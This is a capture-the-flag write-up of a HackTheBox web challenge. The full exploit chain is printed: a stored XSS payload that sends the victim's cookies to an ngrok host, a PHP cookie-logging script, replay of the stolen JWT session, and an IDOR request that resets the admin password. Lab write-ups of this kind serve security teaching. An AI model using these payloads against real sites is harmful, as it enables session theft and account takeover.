---
title: HTB-CA22-web-kryptos_support
date: "2022-05-19"
description: web challenge during Cyber Apocalypse 2022
tldr: xss,idor
tags: [htb,hackthebox,ca22,cyber-apocalypse22,idor,xss,ngrok]
---

## Background story
Each challenge had a story tied to it, for this challenge it was:   

The secret vault used by the Longhir's planet council, Kryptos, contains some very sensitive state secrets that Virgil and Ramona are after to prove the injustice performed by the commission.  
Ulysses performed an initial recon at their request and found a support portal for the vault. Can you take a look if you can infiltrate this system?


## Initial analysis

It looks like a regular webpage with a field where information can be entered. After a while a message appears about an admin that will review the ticket shortly.

![htb-ca22-krysup1](/img/htb-ca22-krysup1.png)

Install [ngrok](https://ngrok.com/download) in order to get a ping-back address for any XSS we try out.


### Enumeration
In order to see wheter there are any more interesting folders, dirb is used :

```shell
dirb [http://178.62.73.26:31821/](http://178.62.73.26:31821/)  
  
-----------------  
DIRB v2.22  
By The Dark Raver  
-----------------  
  
START_TIME: Sun May 15 00:05:03 2022  
URL_BASE: [http://178.62.73.26:31821/](http://178.62.73.26:31821/)  
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt  
  
-----------------  
  
GENERATED WORDS: 4612  
  
---- Scanning URL: [http://178.62.73.26:31821/](http://178.62.73.26:31821/) ----  
+ [http://178.62.73.26:31821/admin](http://178.62.73.26:31821/admin) (CODE:302|SIZE:23)  
+ [http://178.62.73.26:31821/Admin](http://178.62.73.26:31821/Admin) (CODE:302|SIZE:23)  
+ [http://178.62.73.26:31821/ADMIN](http://178.62.73.26:31821/ADMIN) (CODE:302|SIZE:23)  
+ [http://178.62.73.26:31821/login](http://178.62.73.26:31821/login) (CODE:200|SIZE:2352)  
+ [http://178.62.73.26:31821/Login](http://178.62.73.26:31821/Login) (CODE:200|SIZE:2352)  
+ [http://178.62.73.26:31821/logout](http://178.62.73.26:31821/logout) (CODE:302|SIZE:23)  
+ [http://178.62.73.26:31821/settings](http://178.62.73.26:31821/settings) (CODE:302|SIZE:23)  
+ [http://178.62.73.26:31821/static](http://178.62.73.26:31821/static) (CODE:301|SIZE:179)  
+ [http://178.62.73.26:31821/tickets](http://178.62.73.26:31821/tickets) (CODE:302|SIZE:23)
```

## XSS attack 

Run ngrok: `ngrok http 80` and make sure that `apache2` or something similar is running, to respond on the traffic. Because ngrok is just like a port-forwarder and won't handle any XSS/HTTP replies.

After quite a few attempts and tries with different php files, a working XSS was found: 
```java
"><script>document.location='https://3cdc-92-32-1-75.eu.ngrok.io/cookies.php?c='+document.cookie;</script>
```

with the `cookies.php` file: 
```php
<?php  
  
header('Location:https://3cdc-92-32-1-75.eu.ngrok.io'); // Redirecting it towards a particular website.  
  
$cookie = $_GET["c"];  
  
$file = fopen("log.txt", "a"); //Creating a Text file for storing the Session details while appending.  
  
fwrite($file, $cookie "\n\n"); //Writing the text of Cookie in the Log File.  
  
?>
```

after a short while, we can see in the apache `access.log` that the challenge-server has connected back to us: 
```shell
reply in the “access log” from apache:  
::1 - - [17/May/2022:20:30:18 +0200] "GET /cookies.php?c=session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI4MTIyMTh9.AXQjAq7Qj60hSOfzBjYE0XE84NYHI_1hcANOFjUOWX8 HTTP/1.1" 500 185 "http://127.0.0.1:1337/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/101.0.4950.0 Safari/537.36"
```

##  Use the JWT 
The cookie that was received in the log was a `Java Web Token` which can be used as a session cookie. Under the "storage" part of the browser, create a cookie called session and enter: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI4MTIyMTh9.AXQjAq7Qj60hSOfzBjYE0XE84NYHI_1hcANOFjUOWX8`

Refresh the page and try to reach the `/settings` page. Now we are apparently logged in  as the `moderator` user.

![htb-ca22-krysup2](/img/htb-ca22-krysup2.png)

we can update the password for the moderator user and try to login on the `/login` folder, but because the XSS we posted earlier is in the system as a ticket, we will execute the xss on ourselves.

Capture the GET request with `burp-suite` to the `/tickets` page and use burp to "browse" instead, and get a text version of the site presented.

```html
GET /tickets HTTP/1.1  
Host: 165.22.125.212:30120  
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0  
Accept: */*  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate  
Referer: [http://165.22.125.212:30120/login](http://165.22.125.212:30120/login)  
Content-Type: application/json  
Origin: [http://165.22.125.212:30120](http://165.22.125.212:30120)  
Content-Length: 47  
Connection: close  
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI4MjAyNTh9.l2ugGZ3XWWrGuel8aGkPMX28SKLXRk3UOMihEiOq8uc  
  
{"username":"moderator","password":"password1"}
```

and the resulting page looks like: 
```html
<html lang="en">  
<head>  
<meta charset="UTF-8">  
<meta name="viewport" content="width=device-width, initial-scale=1.0">  
<meta http-equiv="X-UA-Compatible" content="ie=edge">  
<link rel="icon" type="image/x-icon" href="/static/images/favicon.png">  
<title>Kryptos Vault</title>  
<link rel="stylesheet" href="/static/css/tickets.css">  
</head>  
<body>  
<nav class="nav-bar">  
<ul>  
<li>  
<a href="/settings">Settings</a>  
</li>  
</ul>  
</nav>  
<nav class="logged-bar">  
<ul>  
<li>  
logged in as (moderator), <a href="/logout">logout</a>  
</li>  
</ul>  
</nav>  
<div class="container on">  
<div class="screen">  
<h3 class="title">  
Kryptos Vault Support tickets  
</h3>  
<div class="message-container">  
  
<div class="ticket-card">  
<div class="c1"><span>Submitted </span></div>  
<div class="c2"><p>2022-05-17 20:30:53</p></div>  
<div class="c1"><span>Message </span></div>  
<div class="c2"><p>I have lost my rfid for the vault. My vault serial is 000083921. Please send me a new rfid.</p></div>  
</div>  
  
<div class="ticket-card">  
<div class="c1"><span>Submitted </span></div>  
<div class="c2"><p>2022-05-17 20:30:53</p></div>  
<div class="c1"><span>Message </span></div>  
<div class="c2"><p>Vault 000076439 requires maintenance.</p></div>  
</div>  
  
<div class="ticket-card">  
<div class="c1"><span>Submitted </span></div>  
<div class="c2"><p>2022-05-17 20:31:14</p></div>  
<div class="c1"><span>Message </span></div>  
<div class="c2"><p>"><script>document.location='[https://3cdc-92-32-1-75.eu.ngrok.io/cookies.php?c='+document.cookie;](https://3cdc-92-32-1-75.eu.ngrok.io/cookies.php?c='+document.cookie;) </script></p></div>  
</div>  
  
  
</div>  
</div>  
</div>  
</body>  
</html>
```

## JWT Manipulation
Trying to modify the JWT token with [https://jwt.io/](https://jwt.io/) didn't work, because the token couldn't be signed again due to lacking information.

Instead we recall that the `/settings` page just required the password and a UID for updating a user.

Capture that POST request with burp, and change the UID to `1` instead.

```html
POST /api/users/update HTTP/1.1  
Host: 46.101.30.188:30634  
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0  
Accept: */*  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate  
Referer: [http://46.101.30.188:30634/settings](http://46.101.30.188:30634/settings)  
Content-Type: application/json  
Origin: [http://46.101.30.188:30634](http://46.101.30.188:30634)  
Content-Length: 34  
Connection: close  
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI4NjA1ODJ9.AcOnO7dcusxXZl4t58TWF50Yn8Oug37gqJnF5L8Fsjw  
  
{"password":"password2","uid":"1"}
```

reply back from the server is a very positive one: 

```html
HTTP/1.1 200 OK  
X-Powered-By: Express  
Content-Type: application/json; charset=utf-8  
Content-Length: 54  
ETag: W/"36-RArwqjccHL1q7o0owZa+anWnvtw"  
Date: Wed, 18 May 2022 07:57:30 GMT  
Connection: close  
  
{"message":"Password for admin changed successfully!"}
```

we can now login as admin and get the flag ! 

![htb-ca22-krysup3](/img/htb-ca22-krysup3.png)

Flag: `HTB{x55_4nd_id0rs_ar3_fun!!}`